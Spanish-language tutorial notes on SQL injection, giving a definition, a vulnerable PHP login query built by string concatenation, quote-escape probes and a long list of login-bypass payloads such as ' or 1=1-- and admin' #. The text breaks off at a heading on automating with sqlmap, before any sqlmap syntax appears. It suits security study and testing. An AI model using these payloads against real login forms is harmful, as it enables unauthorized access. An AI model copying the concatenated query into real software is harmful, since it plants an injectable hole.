## ¿qué es una sqli inyection?

Una SQL Injection es un tipo de ataque que ocurre cuando un atacante es capaz de "inyectar" código SQL malicioso en una consulta que se envía a su base de datos.

👉 En otras palabras: el atacante logra manipular las consultas a la base de datos para que hagan cosas no deseadas, como:

  obtener datos confidenciales,

  modificar o eliminar datos,

  saltarse controles de autenticación,

  ejecutar comandos administrativos en la base de datos.

 ## 📌 ¿Por qué ocurre?

 Sucede cuando una aplicación web no valida correctamente la entrada del usuario antes de usarla en una consulta SQL.

 🔍 Ejemplo sencillo

Supongamos que en una página de login tiene este código en PHP:
```
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```
Si el atacante en el campo password escribe:
```
' OR '1'='1
```
La consulta que se ejecuta es:
```
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
```
Como '1'='1' siempre es verdadero, es posible que el atacante logre iniciar sesión sin conocer la contraseña.


## 🔍 ¿cómo detectamos si tiene esta vulnerabilidad?
Cuando vemos campos a rellenar intentaremos inyectar y veremos la respuesta
lo primero es intentar escapar del contexto actual con:
```
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
y luego corregimos la consulta.
podemos automatizarlo con diccionarios como seclist que incluye muchos payloads y atendermos a la respuesta.
las inyecciones más comunes para hacer de forma manual son:
```
" or 1=1
" or 1=1#
" or 1=1--
" or 1=1/*
' or 1=1
' or 1=1#
' or 1=1--
' or 1=1/*
admin" #
admin" --
admin" or "1"="1
admin" or "1"="1"#
admin" or "1"="1"--
admin" or "1"="1"/*
admin" or 1=1
admin" or 1=1#
admin" or 1=1--
admin" or 1=1/*
admin") or "1"="1
admin") or "1"="1"#
admin") or "1"="1"--
admin") or "1"="1"/*
admin") or ("1"="1
admin") or ("1"="1"#
admin") or ("1"="1"--
admin") or ("1"="1"/*
admin"/*
admin"or 1=1 or ""="
admin' #
admin' --
admin' or '1'='1
admin' or '1'='1'#
admin' or '1'='1'--
admin' or '1'='1'/*
admin' or 1=1
admin' or 1=1#
admin' or 1=1--
admin' or 1=1/*
admin') or '1'='1
admin') or '1'='1'#
admin') or '1'='1'--
admin') or '1'='1'/*
admin') or ('1'='1
admin') or ('1'='1'#
admin') or ('1'='1'--
admin') or ('1'='1'/*
admin'/*
admin'or 1=1 or ''='
or 1=1
or 1=1#
or 1=1--
or 1=1/*
```

## 🤖 automatizar el ataque

Podemos automatizar el ataque con herramientas como sqlmap, su sintaxis es la sigueinte:


